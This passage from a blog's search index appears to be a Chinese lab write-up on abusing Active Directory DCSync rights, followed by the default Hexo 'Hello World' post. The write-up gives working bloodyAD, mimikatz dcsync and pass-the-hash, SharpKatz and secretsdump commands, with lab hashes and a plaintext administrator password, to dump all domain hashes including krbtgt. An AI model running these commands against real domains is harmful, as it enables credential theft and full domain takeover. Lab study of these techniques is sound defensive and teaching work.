bloodyAD.py -d hack-guan.com -u exchange$ -p Hack@12 --host 10.10.10.10 add dcsync hackweb</span><br><span class="line"></span><br><span class="line">知道账户hash:</span><br><span class="line">proxychains3 python3 bloodyAD.py -d hack-guan.com -u exchange$ -p :690f662f7f12700eae9e1c65dcd648be --host 10.10.10.10 add dcsync hackweb</span><br><span class="line"></span><br><span class="line">删除dcsync：将add改为remove即可</span><br><span class="line"></span><br><span class="line">Commands:</span><br><span class="line">  &#123;add,get,remove,set&#125;</span><br><span class="line">    add                 [ADD] function category</span><br><span class="line">    get                 [GET] function category</span><br><span class="line">    remove              [REMOVE] function category</span><br><span class="line">    set                 [SET] function category</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1689315265810-cc5ccfa2-1828-4c4d-bb40-67fa091b73e1.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1689315246685-3214540d-ae6b-4131-90b1-2dafa5bf0397.png"></p><p><strong>验证</strong></p><p><strong>1）建立代理</strong></p><p><strong>2）hash传递目标域用户</strong></p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1689321628111-60367138-569b-4d05-9c6f-f016462df7e5.png"></p><p>3）SharpKatz.exe利用目标账户的dcsync功能导出域所有hash（mimikatz不能远程导出，无法指定域）</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1689321710504-826ade1b-995b-42c7-8216-782563908a73.png"></p><p>4）成功</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1689321862196-7a7fadea-000b-4c01-8d79-c1e902af8cd2.png"></p><h1 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h1><h2 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h2><p>（环境：通过socks5代理使得外域机可以访问域内主机，通过远程桌面访问我们控制的域机器来操作）</p><p>前提，已经通过上述步骤为所控制的域用户赋予DCSync权限</p><p>将mimitakz上传到我们完全控制的域机器，远程登录（该域用户也是本地管理员）</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688997617863-67a87615-a827-4d4b-a8cc-b5cae6863ed3.png"></p><p>直接用以下命令导出域hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;log Micropoor.txt&quot;  &quot;lsadump::dcsync /domain:guan.com /all /csv&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure><h2 id="dc-hash传递"><a href="#dc-hash传递" class="headerlink" title="dc$ hash传递"></a>dc$ hash传递</h2><p>(环境：通过socks5代理使得外域机可以访问域内主机，通过远程桌面访问我们控制的域机器来操作)</p><p>验证证初始环境</p><p>mimikatz使用dcsync功能导出hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;log Micropoor.txt&quot;  &quot;lsadump::dcsync /domain:guan.com /all /csv&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure><p>失败报错，当前域用户没有dcsync权限</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688562663286-8e21ee82-045a-423a-9c7d-eb9e411108e4.png"></p><p>先拿到DC$ 的hash</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688562356812-cfbac079-0c06-4037-bdac-eaa40d088ff3.png"></p><p>利用mimikatz 进行hash传递获得注入dc$后的命令窗口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:dc$ /domain:guan.com /ntlm:963acb058f2fd451a689d86b51739fe1&quot;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688562822915-0b5d5e8e-5a38-4e8d-af81-70324577f00a.png"></p><p>再次实践，mimikatz使用dcsync功能导出hash</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688998111140-4d2eab5e-450c-4e48-a2df-b33bae8f875a.png"></p><p>尝试在此窗口下加载powerview脚本将dcsync 权限赋给guan1</p><p>失败，可能dc$没有这个权限</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688998216159-09346049-e7bc-440e-b19e-c9be96295d2e.png"></p><p>尝试用域管的hash进行hash传递，验证是否真的是dc$账户没有赋予dcsync的权限，还是说是远程登录相关限制的问题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:administrator /domain:guan.com /ntlm:3642639123c37049ac21e1d12b39eb17&quot;</span><br></pre></td></tr></table></figure><p>域管的hash传递可以成功赋予</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688998621580-69b4cb09-0128-4819-ba14-fd0c15f5967c.png"></p><p>确认是dc$只是有dcsync这个功能，但并没有赋予其它域用户这个功能的权限</p><h2 id="Sharpkatz"><a href="#Sharpkatz" class="headerlink" title="Sharpkatz"></a>Sharpkatz</h2><p>（先通过socks代理使得外域机能联系域内主机，使用proxifier）</p><p>以用域管账户密码导出krbtgt为例（域管默认有dcsync这个权限）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SharpKatz.exe --Command dcsync --User krbtgt --Domain guan.com --DomainController 10.10.10.60 --AuthUser administrator --AuthDomain Guan.com --AuthPassword Guan207566903</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sharekatz.exe -h 查看帮助文档</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1689002057974-be26b00f-ceab-47e1-94ed-80c516707b2d.png"></p><h2 id="secretsdump"><a href="#secretsdump" class="headerlink" title="secretsdump"></a>secretsdump</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">知道账户密码</span><br><span class="line">proxychains3 python3 secretsdump.py GUAN/administrator:Guan207566903@10.10.10.60</span><br><span class="line"></span><br><span class="line">知道账户hash</span><br><span class="line">proxychains3 python3 secretsdump.py -hashes :3642639123c37049ac21e1d12b39eb17 GUAN/administrator@10.10.10.60</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1689002527669-343a90be-07af-470a-976e-c593af58b4e9.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1689002757841-43d5f596-ebad-4984-aaa2-f417ec20ffa9.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2024/08/10/hello-world/"/>
      <url>/2024/08/10/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
